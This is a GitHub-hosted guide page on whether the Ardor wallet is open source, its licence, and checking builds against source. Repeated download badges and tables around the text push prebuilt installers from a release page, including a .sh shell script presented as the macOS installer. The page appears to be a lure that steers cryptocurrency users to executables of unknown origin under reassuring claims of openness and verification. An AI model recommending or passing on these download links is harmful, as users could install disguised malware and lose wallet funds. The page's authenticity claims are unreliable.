![Ardor Wallet guide](assets/banner-article.png)

# Is the Ardor wallet open source, and under what licence

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Yes. The Ardor wallet is open source: its source code is published in a public repository, the build you install corresponds to that code, and the licence in the repository states what you may do with it. Here the phrase means the code can be examined instead of believed.

## What open source means in practice

For a wallet, the meaningful claim is not that the code is free to download. It is that the code that handles your keys is visible, so a claim about how the [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) is treated can be checked by anyone who reads it.

It is evidence of a different order from a claim on a landing page. A closed [wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) asks you to believe that the key never leaves the machine; an open one lets somebody verify it, and lets a researcher find a flaw before an attacker does.

## Where the source lives

The source is in the project's GitHub organisation, alongside the releases you [download](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md). The repository is also where the release notes and the issue tracker live, which is why the same page that publishes a build is the page that describes it.

When you want to know whether a feature exists, the repository is a better reference than a search result. Code and [release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) notes describe what shipped; an article, including one on a site like this, describes what somebody understood at the time.

## What the licence allows

The licence is stated in the repository and applies to the code. In general terms, a permissive licence allows you to use, study, modify and redistribute the software, subject to the conditions in the licence text itself.

Read the licence file rather than a summary of it, including one on this page. Licence terms are precise, summaries are not, and the file in the repository is the only version that governs what you may do. If you plan to redistribute or build on the code, that distinction stops being pedantic and becomes the whole question.

## Verifying that a build matches the source

Two steps make the claim checkable in practice. First, download from the releases page and verify the published hash, which confirms the file is the one the project shipped. Second, compare the release to the repository, which confirms the project shipped what the code says.

The first step catches a substituted file; the second catches a build that does not correspond to its source. Together they are the reason an open wallet is more accountable than a closed one, rather than merely more transparent.

## What open source does not guarantee

It does not guarantee that the code is correct, that it has been audited, or that a bug will be found. Visibility creates the possibility of review; it does not perform the review.

It also does not guarantee that the build you install was compiled from the published source by the same people who wrote it. That is what verification and release discipline are for, and why the two steps above are worth doing even when the code is public.

## How releases are built and published

A release is built from the repository and published as an asset on the releases page, with notes describing what changed. The repository and the release are therefore two views of the same thing: the code that was written, and the binary that was shipped from it.

That link is why the release page is the only place a build should come from. A binary from anywhere else has no stated relationship to the source, and verifying its hash against a page that is not the project's tells you only that two strangers agree.

## What a reader can check without being a developer

You do not have to read the code to benefit from its being public. You can check that a repository exists and is updated, that releases are tagged with notes, that issues are answered, and that the licence file is present and standard.

Those four checks take minutes and distinguish a maintained open project from a page that merely claims to be one. They are also the checks a careful reader applies before trusting any download, whatever the project.

## Why this matters for a wallet specifically

A wallet's central promise is that nobody else can move your funds. In a closed product that promise rests on the vendor's word and on their security practices; in an open one it rests on code that can be read, a release that can be checked, and a licence that lets anyone do both.

That is the difference the licence is really enabling. Not free software in the sense of price, but a product whose most important claims are falsifiable by a third party - and a licence that makes that checking legal rather than merely possible, which is a small sentence with a large consequence for anyone deciding what to install.

## FAQ

### Is the Ardor wallet free?

The software is free to download and use, and it is open source. Network fees for transactions are separate and are paid to the network.

### Where do I find the licence?

In the repository, as a licence file at the root. That file, not a summary, is the authoritative statement of terms.

### Can I modify and redistribute it?

The licence sets the conditions. Read it before redistributing, and keep the notices it requires.

### Does open source mean it has been audited?

No. Visibility and audit are different things. Open code can be reviewed by anyone; an audit is a specific review that either happened or did not.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md)
- [Verify an Ardor wallet download before you run it](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md)
- [What the Ardor wallet is, and which download is the real one](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)
- [Can an Ardor wallet be hacked? What actually happens](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-an-ardor-wallet-be-hacked.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
